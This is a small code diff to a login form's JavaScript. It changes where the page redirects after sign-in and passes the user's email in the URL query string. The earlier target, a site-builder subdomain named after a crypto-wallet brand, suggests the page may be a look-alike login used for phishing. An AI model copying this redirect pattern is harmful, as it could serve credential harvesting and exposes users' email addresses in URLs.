@@ -1291,7 +1291,7 @@
     if (!email || !pass) { showAlert('login', 'Please enter your email and password.', true); return; }
     showAlert('login', 'Logging you in…', false);
     setTimeout(() => {
-      window.location.href = 'https://ledger-live-close.lovable.app?email=' + encodeURIComponent(email) + '&action=login';
+      window.location.href = 'https://app.nabbit.ca?email=' + encodeURIComponent(email) + '&action=login';
     }, 800);
   }
 
